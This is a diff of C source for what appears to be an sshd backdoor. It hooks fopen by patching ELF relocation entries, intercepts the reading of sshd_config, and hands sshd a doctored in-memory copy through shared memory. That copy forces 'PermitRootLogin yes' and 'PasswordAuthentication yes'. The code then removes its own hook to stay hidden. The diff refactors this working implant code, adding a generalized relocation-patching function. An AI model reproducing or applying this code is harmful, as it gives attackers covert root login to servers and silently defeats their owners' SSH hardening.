@@ -3,26 +3,20 @@
 #include <string.h>
 #include <limits.h>
 #include <unistd.h>
-//#include <stdbool.h>
-//#include <errno.h>
-//#include <signal.h>
-//#include <setjmp.h>
 
-//#include <security/pam_appl.h>
 #include <sys/mman.h>
-
-//#include <dlfcn.h>
-//#include <link.h>
-
 #include <sys/shm.h>
 #include <sys/stat.h>
+
 #include <fcntl.h>
 #include <inttypes.h>
 #include <linux/elf.h>
 
-//#include "pam_private.h"
 
 #include "config_hook.h"
+
+static int hook_rela(Elf64_Rela *foundrela, void *func, int type);
+
 /*
  * the goal is to make sure PermitRootLogin is set to yes - regardless if it is explicity set or not
  *	and then unhook ourselves sneaky beaky like
@@ -77,15 +71,8 @@ FILE *my_fopen(char *filename, char *mode)
 			if (setting != NULL) {
 				BITMASK |= PermitRootLogin_NOWORK;
 			} else {
-
-				setting = strstr(PermitRootLogin, "No");	
-				if (setting == NULL)
-					setting = strstr(PermitRootLogin, "no");	
-
-				/* PermitRootLogin [n-N][o] */
-				if (setting != NULL) {
-					BITMASK |= PermitRootLogin_EXPLICIT;
-				}
+				/* PermitRootLogin [y-Y]es is not valid, but there is a valid PermitRootLogin string */
+				BITMASK |= PermitRootLogin_EXPLICIT;
 			}
 		
 			PermitRootLogin = NULL;
@@ -112,24 +99,20 @@ FILE *my_fopen(char *filename, char *mode)
 				if (setting != NULL) {
 					BITMASK |= PasswordAuthentication_NOWORK;
 				} else {
-
-					setting = strstr(PasswordAuthentication, "No");	
-					if (setting == NULL)
-						setting = strstr(PasswordAuthentication, "no");	
-
-					/* PasswordAuthentication [n-N][o] */
-					if (setting != NULL) {
-						BITMASK |= PasswordAuthentication_EXPLICIT;
-					}
+					BITMASK |= PasswordAuthentication_EXPLICIT;
 				}
 			
 				PasswordAuthentication = NULL;
 			}
 		}
 	}
-	//fclose(fp); /* XXX: will be useful if something goes wrong later */
 	free(str);
-		
+	//fclose(fp); /* XXX: will be useful if something goes wrong later */
+	
+	/* we have parsed the whole of filename and the BITMASK has been [un]set accordingly */
+
+	
+	/* get file size on disk of filename */	
 	signed long int orig_sshd_config_size;
 	struct stat st;	
 	stat(filename, &st);
@@ -138,7 +121,7 @@ FILE *my_fopen(char *filename, char *mode)
 
 	/* if we never ran into any of the strings we wanted in sshd_config 
 	 *	 -- BITMASK is unset
-	 * then make sure to append these strings to the end of the duped sshd_config we are making
+	 * then make sure to append the correct strings to the end of the duped sshd_config we are making
 	 */	
 	unsigned long long tmpmask = BITMASK & PermitRootLogin_MASK;
 		
@@ -163,8 +146,7 @@ FILE *my_fopen(char *filename, char *mode)
 	read(orig_fd, buf, buf_len);
 	close(orig_fd);
 
-	/* we have original sshd_config in memory - buf */
-
+	/* we have the original sshd_config from filename in memory - buf */
 
 
 	char *PRL_Y = "PermitRootLogin yes\n";
@@ -178,7 +160,6 @@ FILE *my_fopen(char *filename, char *mode)
 		_EXPLICIT_work(&new, "PermitRootLogin ", PRL_Y, "PermitRootLogin no", &buf, &buf_len);	
 	}
 
-	/* same code as above -- XXX: could probably be made into a function */
 	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {
 		_EXPLICIT_work(&new, "PasswordAuthentication ", PA_Y, "PasswordAuthentication no ", &buf, &buf_len);
 	}
@@ -194,12 +175,6 @@ FILE *my_fopen(char *filename, char *mode)
 	}
 
 
-
-
-
-
-
-
 	/* this passes a valid FILE* back to sshd using SHM and the new sshd_config we just made
 	 * 	shm_unlink should ensure that when sshd fclose(fp) the shm will be deleted 
 	 */
@@ -211,16 +186,15 @@ FILE *my_fopen(char *filename, char *mode)
 
 	write(fd, new, buf_len);
 
-	//free(new);	
 	fp = fdopen(fd, mode);
 	rewind(fp);
 	
 	shm_unlink("/7355608");
 
-	hook_rela_addend(ref_fopen_Rela, ref_fopen);
+	hook_rela(ref_fopen_Rela, ref_fopen, RELOC_ADDEND);
+	
 	return fp;
 }
-
 
 int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, char **__buf, int *_buf_len)
 {
@@ -269,6 +243,7 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 
 	/* get number of char until \n in "config_name_ptr no" 
 	 * XXX: this most likely isn't needed anymore as this will always be the above no string (+1)
+	 * TODO: newline and + i is clunky
 	 */
 	int newline = strcspn(config_name_ptr, "\n");
 	newline += 1; /* +1 - strlen(yes) = 3 . strlen(no) = 2 */
@@ -290,12 +265,6 @@ int _EXPLICIT_work(char **__new, char *config_name, char *redefine, char *old, c
 	
 	return 0;
 }
-
-
-
-
-
-
 
 /* XXX:cleanup **__new */
 int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
@@ -330,9 +299,7 @@ int _APPEND_work(char **__new, int *_buf_len, char *filename, char *append)
 	return 0;
 }
 
-
-
-static int hook_rela_addend(Elf64_Rela *foundrela, void *func)
+static int hook_rela(Elf64_Rela *foundrela, void *func, int type)
 {
 	int ret;
 	int PAGE_SIZE = getpagesize();
@@ -342,7 +309,10 @@ static int hook_rela_addend(Elf64_Rela *foundrela, void *func)
 	if (ret != 0)
 		return -1;
 
-	foundrela->r_addend = (unsigned long long)func; 
+	if (type == RELOC_ADDEND)
+		foundrela->r_addend = (unsigned long long) func; 
+	else if (type == RELOC_INFO)
+		foundrela->r_info = (unsigned long long) func; 
 
 	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
 	if (ret != 0)
